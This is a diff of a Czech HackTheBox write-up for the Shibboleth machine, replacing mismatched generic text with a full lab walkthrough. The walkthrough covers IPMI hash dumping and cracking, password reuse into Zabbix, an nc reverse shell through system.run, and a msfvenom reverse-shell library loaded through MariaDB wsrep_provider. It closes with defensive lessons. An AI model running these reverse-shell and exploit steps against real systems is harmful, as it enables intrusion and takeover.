@@ -7,110 +7,170 @@ tags: linux rce exploit enumeration privesc hackthebox
 ---
 ## Úvod a kontext
 
-U Shibboleth není hlavní hodnota v jednom efektním kroku, ale ve vazbě mezi Apache a D-Bus.
+Shibboleth je stroj, kde rozhodující stopa neleží na webu, ale na netypicky otevřeném IPMI portu. Webová enumerace sice ukáže několik virtuálních hostů, ale bez přístupu do Zabbixu by sama o sobě nestačila. Klíč k footholdu přinese až IPMI hash, jeho prolomení a reuse stejného hesla v administraci monitoringu.
 
-Článek dává smysl číst hlavně jako rozbor rozhodování: proč právě tyto stopy vedou k shell získaný exploitací zranitelné služby a proč po získání shellu dává smysl řešit zneužití D-Bus a práce s `iptables`.
+Root část pak dobře ukazuje rozdíl mezi databázovým účtem a databázovým serverem. Únik hesla do MariaDB ještě automaticky nedává roota, ale v kombinaci se zranitelným Galera `wsrep_provider` už ano.
 
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+Nejdřív mapuji standardní TCP služby. Na první pohled je vidět hlavně Apache na portu `80`.
+
 ```bash
 ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
 ```
-```
+
+```text
 PORT      STATE  SERVICE VERSION
 80/tcp    open   http    Apache httpd 2.4.41
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Did not follow redirect to http://shibboleth.htb/
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
 ```
 
-### Vyhledání otevřených portů (2)
+Vedle TCP služeb ale mělo smysl zkontrolovat i UDP, protože některé správcovské protokoly se běžných TCP scanů vůbec neúčastní.
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
 ```bash
 nmap -sU --min-rate 5000 --max-retries 1 -p- --open $IP
 ```
-```
+
+```text
 PORT    STATE SERVICE
 623/udp open  asf-rmcp
 ```
 
+Port `623/udp` znamená IPMI. To je silná stopa, protože špatně chráněné BMC rozhraní často dovolí získat challenge-response hash bez znalosti hesla.
+
 ## Analýza zjištění
 
-### Lámání hesel nebo hashů
+### Dump hashů z IPMI
 
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-```bash
-hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt
-```
-```
-=> ilovepumkinpie1
-```
+Na IPMI se hodí specializovaný skener, který umí vytáhnout hash autentizace:
 
-## Získání přístupu
-
-### Spuštění exploitu
-
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
 ```text
 msfconsole
-```
-```
 use scanner/ipmi/ipmi_dumphashes
 set RHOST 10.10.11.124
+```
 
+```text
 [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:__CENSORED__:__CENSORED__
 ```
 
-### Získání user flagu
+Tento krok ještě nepřináší přímý přístup, ale poskytuje materiál pro offline cracking. To je bezpečnostně důležité: obrana se už nemůže spoléhat na rate limiting ani MFA, protože další útok probíhá mimo cílový systém.
 
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+### Prolomení hesla a vazba na Zabbix
+
+Hash se podařilo prolomit pomocí `hashcat`:
+
+```bash
+hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt
+```
+
+```text
+ilovepumkinpie1
+```
+
+V další fázi dávalo smysl najít webové subdomény, které by stejné heslo mohly používat. Subdomain fuzzing odhalil `monitor`, `monitoring` a hlavně `zabbix`:
+
+```text
+monitor
+monitoring
+zabbix
+```
+
+Přihlášení do Zabbixu fungovalo s kombinací:
+
+```text
+Administrator / ilovepumkinpie1
+```
+
+To je důležitý moment celého řetězce: nejde o samotný IPMI přístup, ale o reuse stejného hesla mezi oddělenými službami.
+
+## Získání přístupu
+
+### RCE přes `system.run` v Zabbixu
+
+Po přihlášení do Zabbixu bylo možné vytvořit item se vzdáleným příkazem přes `system.run`. Tato funkce je legitimní součást monitoringu, ale v rukou administrátora je to přímo kanál pro spuštění shellu na hostu.
+
+Použitý příkaz:
+
+```text
+system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.9 4000 > /tmp/f&,nowait]
+```
+
+Tím vznikl shell na cílovém systému. Z `/etc/passwd` bylo vidět, že zajímavý lokální účet je `ipmi-svc`, a protože heslo z IPMI už bylo známé, šlo vyzkoušet i lokální reuse:
+
+```bash
+su ipmi-svc
+```
+
+Po zadání stejného hesla `ilovepumkinpie1` se podařilo přepnout do tohoto účtu a potvrdit uživatelský přístup:
+
 ```bash
 cat user.txt
 ```
+
 ```text
 __CENSORED__
 ```
 
-Další klíčový artefakt byl konfigurační soubor Zabbix serveru:
+## Eskalace oprávnění
+
+### Databázové přihlašovací údaje ze Zabbix konfigurace
+
+Jakmile už běží shell na hostu, dává smysl procházet lokální konfigurace služeb. U Zabbix serveru je klíčový soubor:
+
+```text
+/etc/zabbix/zabbix_server.conf
+```
+
+Ten obsahoval přihlašovací údaje do MariaDB:
+
 ```ini
 DBHost=localhost
 DBName=zabbix
 DBUser=zabbix
-DBPassword=__CENSORED__
+DBPassword=bloooarskybluh
 ```
 
-### Spuštění exploitu (2)
+Databázové heslo samo o sobě nestačí, ale ukazuje na další důvěryhodnou službu běžící lokálně s vyššími oprávněními.
 
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
-```text
+### Zneužití `wsrep_provider`
+
+Na hostu byla zneužitelná Galera/MariaDB konfigurace umožňující nahrát vlastní sdílenou knihovnu jako `wsrep_provider`. Princip je jednoduchý: databázový proces načte útočníkem dodaný `.so` soubor a spustí jeho inicializační kód v privilegovaném kontextu.
+
+Nejdřív se připravil payload:
+
+```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4001 -f elf-so -o CVE-2021-27928.so
 ```
 
-## Eskalace oprávnění
+Pak se knihovna zapsala jako nový provider:
 
-### Získání root flagu
+```sql
+mysql -u zabbix -pbloooarskybluh
+SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
+```
 
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+Tím došlo ke spuštění kódu v kontextu databázové služby a následně i k přístupu k `root.txt`:
+
 ```bash
 cat /root/root.txt
 ```
+
 ```text
 __CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
 
-- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako Apache, command injection a D-Bus.
-- User část stála na ověřeném kroku typu shell získaný exploitací zranitelné služby, ne na odhadu bez technického potvrzení.
-- Závěrečná eskalace pak stála na tom, co představuje zneužití D-Bus a práce s `iptables`, takže rozhodující byla práce s lokálním kontextem po footholdu.
+- Zásadní vstupní stopou nebyl web, ale otevřený IPMI port a možnost vytáhnout z něj offline cracknutelný hash.
+- Prolomené heslo mělo skutečnou hodnotu až kvůli reuse mezi IPMI, Zabbixem a lokálním účtem `ipmi-svc`.
+- Zabbix `system.run` není exploit v tradičním smyslu, ale legitimní administrativní funkce, která se po kompromitaci účtu mění v RCE.
+- Root část stála na zneužití databázové funkce pro načtení vlastní knihovny, tedy na důvěře serveru v lokálně zadaný `wsrep_provider`.
 
 ## Co si odnést do praxe
 
-- První obranná lekce míří na Apache, command injection a D-Bus. Příkazy skládající shell řetězce z neověřeného vstupu patří mezi nejrizikovější konstrukce; i zdánlivě omezený parametr se obvykle dá převést na RCE.
-- Druhá lekce je o tom, jak rychle se ze zjištění stane shell získaný exploitací zranitelné služby. Jednorázové RCE je potřeba detekovat i na aplikační vrstvě; upload, template injection nebo command injection často vypadají v logu nenápadně, ale vedou ke stabilnímu shellu.
-- Třetí lekce připomíná riziko, které v praxi představuje zneužití D-Bus a práce s `iptables`. Privilegované procesy komunikující přes D-Bus nebo podobné sběrnice musí důsledně ověřovat, kdo a s jakými parametry požadavek posílá; jinak se z pomocné automatiky stává privesc kanál.
+- IPMI a další out-of-band management musí být izolovaný od běžné sítě. Jakmile je dostupný z útočníkova segmentu, dokáže často obejít běžnou ochranu kolem systému.
+- Reuse hesel mezi správou hardwaru, monitoringem a lokálními účty dramaticky zvyšuje dopad jediné kompromitace. Tyto vrstvy musí mít oddělené identity i tajemství.
+- Monitoring nástroje s funkcemi typu `system.run` je potřeba vnímat jako vysoce privilegovaný prvek infrastruktury. Únik administrátorského účtu zde znamená přímé spuštění příkazů na hostu.
+- Databázové servery nesmí umožnit načítání neověřených lokálních modulů z cest, které může ovlivnit kompromitovaný uživatel. Jinak se z konfigurační volby stane lokální privesc.
